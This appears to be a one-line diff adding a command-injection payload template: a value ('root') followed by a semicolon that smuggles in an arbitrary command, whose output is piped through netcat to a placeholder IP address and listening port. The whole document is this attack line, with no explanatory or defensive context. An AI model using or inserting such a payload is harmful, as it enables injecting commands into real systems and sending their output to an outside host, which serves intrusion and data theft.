@@ -1,0 +1,1 @@
+root; *command here* | nc {IP Address} {Listening port}
